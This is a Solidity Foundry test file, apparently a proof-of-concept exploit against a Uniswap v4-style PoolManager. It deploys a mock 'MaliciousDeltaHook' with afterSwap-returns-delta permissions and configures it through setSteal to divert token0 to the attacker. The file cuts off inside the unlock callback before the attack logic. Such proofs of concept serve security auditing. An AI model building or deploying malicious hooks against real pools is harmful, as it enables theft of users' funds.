// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";

contract Token {
    mapping(address=>uint) public balanceOf;
    function mint(address t,uint a) external {balanceOf[t]+=a;}
    function transfer(address t,uint a) external returns(bool){balanceOf[msg.sender]-=a; balanceOf[t]+=a; return true;}
    function transferFrom(address f,address t,uint a) external returns(bool){balanceOf[f]-=a; balanceOf[t]+=a; return true;}
    function approve(address,uint) external pure returns(bool){return true;}
}

contract POC is Test {
    PoolManager public manager;
    MaliciousDeltaHook public hook;
    Token public token0;
    Token public token1;
    PoolKey public key;

    function setUp() public {
        Token t0=new Token(); Token t1=new Token();
        if(address(t0)>address(t1)){Token tmp=t0; t0=t1; t1=tmp;}
        token0=t0; token1=t1;
        manager=new PoolManager(address(this));
        uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
        vm.etch(a, address(new MaliciousDeltaHook(manager)).code);
        hook=MaliciousDeltaHook(a);
        vm.store(address(hook), bytes32(uint256(0)), bytes32(uint256(uint160(address(manager)))));
        token0.mint(address(this),10000e18);
        token1.mint(address(this),10000e18);
        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(address(hook)));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
        manager.unlock(abi.encode(uint256(1)));
        hook.setSteal(Currency.wrap(address(token0)), address(this));
    }

    function unlockCallback(bytes calldata d) external returns(bytes memory){
        Currency c0=Currency.wrap(address(token0));
        Currency c1=Currency.wrap(address(token1));
        if(abi.decode(d,(uint256))==1){